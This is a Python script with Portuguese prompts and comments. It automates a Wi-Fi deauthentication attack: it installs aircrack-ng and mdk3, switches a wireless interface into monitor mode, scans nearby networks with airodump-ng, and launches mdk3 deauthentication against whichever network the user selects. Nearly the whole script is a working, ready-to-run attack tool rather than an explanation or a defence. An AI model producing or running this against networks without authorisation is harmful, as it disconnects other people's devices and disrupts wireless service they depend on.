import os
import time
import subprocess
import pandas as pd


def limpar():
    try:
        os.system("rm nomes-bssid.txt 2>/dev/null")
    except:
        pass

    try:
        os.system("rm BSSID-01.csv 2>/dev/null")
    except:
        pass

    try:
        os.system("rm interfaces.txt 2>/dev/null")
    except:
        pass


def depencencias():
    if os.name == 'posix':
        nettools = os.system("hash netstat > /dev/null 2>&1")
        aptget = os.system("hash apt-get > /dev/null 2>&1")
        
        if nettools != 0:
            if aptget == 0:
                print("Instalando dependências...")
                print()
                os.system("apt-get install net-tools")
            else:
                os.system("pacman -S net-tools")


        aircrack = os.system("hash aircrack-ng /dev/null 2>&1")
        if aircrack != 0:
            if aptget == 0:
                print("Instalando dependências...")
                print()
                os.system("apt-get install aircrack-ng")
            else:
                os.system("pacman -S aircrack-ng")
                          

        mdk3 = os.system("hash mdk3 /dev/null 2>&1")
        if mdk3 != 0:
            if aptget == 0:
                print("Instalando dependências...")
                print()
                os.system("apt install mdk3")
            else:
                os.system("pacman -S mdk3")
           

# Limpando PATH, gerenciando dependências e gravando nomes de todas interfaces num .txt
limpar()
depencencias()
os.system("clear")
output = os.popen('netstat -i').read()
txt = open("interfaces.txt", "w")
txt.write(output)
txt = open("interfaces.txt", "r")

# Passando interfaces wireless para uma lista
interfaces_disponiveis = []
cont = 1
for linha in txt:
    split = linha.split()
    if split[0] != "Kernel" and split[0] != "Iface" and split[0] != "lo" and split[0] != "Tabela" and split[0] != "Table":
        print([cont], split[0])
        interfaces_disponiveis.append(split[0])
        cont += 1

# Iniciando a interface em Modo Monitor e ocultando saída do terminal
print()
interface_selecionada = int(input("Escolha a interface: ")) - 1
start_monitor_mode = os.popen(f"airmon-ng start {interfaces_disponiveis[interface_selecionada]} 2>/dev/null")
time.sleep(3)

print()
print("[+] Iniciando interface em modo monitor")
print(42 * "-")
print("[+] Buscando redes próximas")

# Se a interface selecionada já estivesse em Modo Monitor, concatena um "n", ex: (wlanmo + n) == wlanmon
# Se nao for o caso, concatena o "mon" ao invés do "n"
if interfaces_disponiveis[interface_selecionada].find("mo") == -1:
    interfaces_disponiveis[interface_selecionada] = interfaces_disponiveis[interface_selecionada] + "mon"
else:
    interfaces_disponiveis[interface_selecionada] = interfaces_disponiveis[interface_selecionada] + "n"

# Inicia a busca de redes num outro terminal e oculta a saída com 2>/dev/nul
start_sniff = os.popen(f"x-terminal-emulator -e bash -c 'airodump-ng -w BSSID --output-format csv {interfaces_disponiveis[interface_selecionada]}' 2>/dev/null")
time.sleep(1)

# Abrindo dataframe gerado pela busca de redes e selecionado colunas do BSSID E ESSID
print()
input('Enter para continuar: ')
os.system("clear")
bssid = pd.read_csv("BSSID-01.csv", usecols=["BSSID", " ESSID"])
bssid = str(bssid)

# Criando txt com os dados da coluna do dataframe (eu preferi manipular um txt, noobzao)
# Para cada linha eu dou um split. Cada palavra dentro da linha possui um index
# Então uso isso para printar os nomes das redes e também para jogar o BSSID em uma lista
MAC = []
arquivo = open('nomes-bssid.txt','w')
arquivo.write(bssid)
arquivo = open('nomes-bssid.txt','r')
cont = 1
for linha in arquivo:
    try:
        valores = linha.split("\n")
        valores = linha.split()
        if " ".join(valores[2:]) != "" and " ".join(valores[2:]) != "MAC NaN" and " ".join(valores[2:]) != "NaN":
            print([cont], " ".join(valores[2:]))
            MAC.append(valores[1])
            cont += 1
    except:
        pass
    
print()
rede = int(input("Selecione a rede: ")) - 1
os.popen(f"mdk3 {interfaces_disponiveis[interface_selecionada]} d {MAC[rede]} ")
print()
print("[+] Desautenticação em andamento >>>")
print(42 * "-")

input("Enter para encerrar: ")
print(42 * "-")
print("[+] Desativando Modo monitor")
os.system(f"airmon-ng stop {interfaces_disponiveis[interface_selecionada]} > /dev/null 2>&1")
print(42 * "-")
print("Saindo...")
limpar()
